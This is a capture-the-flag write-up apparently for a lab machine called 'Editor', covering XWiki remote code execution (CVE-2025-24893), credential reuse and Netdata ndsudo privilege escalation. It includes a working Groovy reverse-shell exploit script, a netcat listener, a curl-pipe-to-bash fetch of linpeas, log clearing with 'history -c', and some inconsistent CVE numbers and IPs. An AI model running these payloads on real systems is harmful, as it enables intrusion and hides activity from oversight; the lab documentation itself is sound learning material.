# Editor

**Machine Name**: Editor

**Machine OS**: Linux

**Difficulty**: Easy

## Introduction



## Information Gathering

Given **10.10.11.80**, did curl on the IP and it gave valuable information that HTTP is open. Next step is to scan the network for gathering more information on the machine.

### TCP Scan

Scan the network with **nmap** tool on TCP connect technique. Set the speed to high (4)

```
nmap -sT -T4 10.10.11.87 -vvv 
```

The results show that there is two HTTP port that open, which is 80 for HTTP that run nginx and 8080 for HTTP that run Jetty.&#x20;

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
8080/tcp open  http    syn-ack Jetty 10.0.20

```

tried to check with **nikto** tool to gather interesting part of the website, it said that there is a **robots.txt** file that may filled with sensitive endpoint.

<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

Open both website in the browser to gather more information and look for attack vector. On **10.10.11.80:80** it shows **SimplistCode Code,** an app that made for code editor. There is a **Docs** navigation and it lead to **wiki.editor.htb** which the same as **10.10.11.80:8080**.

<figure><img src="../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>



IP **10.10.11.80:8080** shows **xwiki,** an open source platform that used like a CMS for enterprise. From here, we can look for **xwiki** version and look for any potential vulnerability that may exist.&#x20;

<figure><img src="../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>



## Enumeration



The xwiki version is [XWiki Debian 15.10.8](https://extensions.xwiki.org/?id=org.xwiki.platform:xwiki-platform-distribution-debian-common:15.10.8:::/xwiki-commons-pom/xwiki-platform/xwiki-platform-distribution/xwiki-platform-distribution-debian/xwiki-platform-distribution-debian-common), based on NVD [**CVE-2025-24983**](https://nvd.nist.gov/vuln/detail/CVE-2025-24893), xwiki has a vulnerability which allow an attacker to perform arbitrary remote code execution through a request in endpoint **/xwiki/bin/get/Main/SolrSearch** on version **5.4** to **15.10.10** and **16.0.0** to **16.4.0.** The vulnerability impact confidentiality, integrity, and availability of the whole xWiki installation and the attacker can gain access to the system with arbitrary code execution. This version of xWiki 15.10.8 is vulnerable to the **CVE-2025-24983** and can be potential attack vector.

<figure><img src="../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>



## Gaining Access

### CVE-2025-24893

I tried to check if the vulnerability exist with an exploit code from author [**a1baradi**](https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py)**,** the exploit worked and shows the **/etc/passwd** that ensure RCE is possible. I did a lot of trial and error on how can I make a reverse shell and gain the system, here I exploit the vulnerability using Python code to create a reverse shell on target machine, the code below got help by chatGPT. Change the 'IP' section with your IP and create netcat listener on your machine.

{% code title="CVE-2025-24893.py" %}
```python
import requests, urllib.parse

payload = '''}}}{{async}}{{groovy}}
def s=new java.net.Socket("Your IP",2911) # change with your IP
def p=new ProcessBuilder("/bin/sh","-i").redirectErrorStream(true).start()
def si=s.getInputStream()
def so=s.getOutputStream()
def pi=p.getInputStream()
def po=p.getOutputStream()
Thread.start{ int b; while((b=si.read())!=-1){ po.write(b); po.flush() } }
Thread.start{ int b; while((b=pi.read())!=-1){ so.write(b); so.flush() } }
{{/groovy}}{{/async}}'''

encoded = urllib.parse.quote(payload, safe='')
exploit_url = f'http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded}'
r = requests.get(exploit_url, timeout=10)
print(r.status_code)
print(r.text[:800])

```
{% endcode %}

To make sure it run, I do grep on '**search on**' to make sure the code work for troubleshooting. Create open netcat listener connection on your attack machine before start running the exploit code. Here I successfully got into the machine as user **xwiki.**

```
nc -nvlp 2911
```

<figure><img src="../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

Next step is to do information gathering on the machine capabilities and identify any potential vulnerablility that can be used to do local privilege escalation. I set up payload server and run linux enumeration tool named **linpeas** to gather more information at high level overview.

#### Setup payload server

Download the file in the **reference** below, make sure the file **linpeas** already in the same directory, and run this code below:&#x20;

```
python3 -m http.server 7000 --bind 0.0.0.0
```

#### Use the payload server

On the target machine, run **curl** to the payload server and supplied **linpeas.sh** file so it will run and gathering information to enumerate and find potential vulnerability or password leak.

```
curl [attacker machine]:7000/linpeas.sh|bash
```

Upon searching for potential file in xwiki that may leak some credentials, I found account **xwiki:xxx** in file **/etc/xwiki/hibernate.cfg.xml**

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

The credentials can log into mysql service, turned out it can also log SSH as user **oliver** with that password and gain further privilege escalation.



## Privilege Escalation

Here I make sure my user and found **netdata** user also in my id.

<figure><img src="../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

Do enumeration again with **linpeas,** this time as user **oliver** may leak more potential vulnerability as it have more privilege than user **xwiki**.

### Check all SUID binaries

Check SUID that can be run as root. There are a lot of **netdata** that can be run.

```
find / -perm -4000 -type f 2>/dev/null
```

<figure><img src="../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

I kinda suspicious with **netdata** as it leak its environments and configurations, may be **netdata** is one of the potential attack vector that can be exploit.

<figure><img src="../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

Here also shows that **netdata** has the capabilities on **cap\_dac\_read\_search** that can read privileged file or directory.

<figure><img src="../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

Also in here, there are some **root** user files but can be read by **netdata** user.

<figure><img src="../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

I checked what is **netdata**, it is an open-source, real-time infrastructure monitoring platform that can be used to monitor, detect, and act across entire infrastructure. Turned out **netdata** ever has a [**CVE-2024-32019**](https://nvd.nist.gov/vuln/detail/CVE-2024-32019) that affect versions `v1.45.0 <= v1.45.0` .

### CVE-2024-32019

This CVE highlight **ndsudo** tool of the Netdata Agent allows an attacker to run arbitrary programs with root permissions. This tool is **root** owned executable with **SUID** bit set. This may lead to local privilege escalation.

I found an exploit creaated by author [**dollarboysushil**](https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation) that check if the vulnerability exist and can be exploited. Tried to run it and the exploit worked gaining **root** user accessibility.

<figure><img src="../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
**pwned.**
{% endhint %}

## Clearing Logs

to clear the logs in linux machine, simply use the history command.

```
history -c
```

This only effective if the .bash\_history set to **/dev/null.**

## Remediation

To remediate the following issue, do the following action:

* **Upgrade** **xWiki** to newer version to ensure free from existing vulnerability.
* Make sure not to put any visible credentials in any config file.
* Upgrade **netdata** to newer version to ensure free from existing vulnerability.
* **Implement least privilege access** to make sure only appropriate user and role can access those services.

## Reference

{% embed url="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" %}

{% embed url="https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py" %}

{% embed url="https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation" %}

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2025-24893" %}

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2024-32019" %}
